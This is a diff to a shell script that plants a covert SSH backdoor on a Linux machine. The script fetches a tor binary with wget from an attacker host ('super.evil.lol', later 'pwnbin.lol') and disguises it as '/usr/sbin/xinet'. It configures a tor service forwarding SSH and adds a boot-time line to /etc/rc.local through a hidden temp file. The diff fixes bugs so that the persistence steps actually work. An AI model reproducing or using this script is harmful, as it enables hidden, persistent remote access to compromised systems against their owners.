@@ -9,11 +9,12 @@ torUp(){
 # Download+install static tor from your http server, let's call it 'xinet'
 cd /tmp
 wget $host/$torBin
-chmod +x tor-static
-mv tor-static /usr/sbin/xinet
+chmod +x $torBin
+mv $torBin /usr/sbin/xinet
 
 # Create a torrc forwarding ssh and call it 'xinet.conf'
-cat _EOF_ << /etc/xinet.conf >
+
+cat << _EOF_ > /etc/xinet.conf
 
 SocksPort 9050 # what port to advertise for application connections
 SocksBindAddress 127.0.0.1 # accept connections only from localhost
@@ -36,7 +37,7 @@ grep -v "exit 0" /etc/rc.local > /tmp/.rc.lol
 echo "ntpdate ntp.ubuntu.com" >>/tmp/.rc.lol # ensure time is correct!
 echo "sudo su xinet -c '/usr/sbin/xinet -f /etc/xinet.conf' &" >>/tmp/.rc.lol 
 echo "exit 0" >> /tmp/.rc.lol
-cp /tmp/.rc.lol > /etc/rc.local
+cp /tmp/.rc.lol /etc/rc.local
 rm -f /tmp/.rc.lol
 
 
@@ -52,8 +53,8 @@ echo '######################################'
 }
 
 # Edit these:
-host=http://super.evil.lol
-torBin=tor-static
+host=pwnbin.lol
+torBin=tor-i686
 
 # Pass -d or --delete on the cli to delete this script afterwards
 case $1 in 
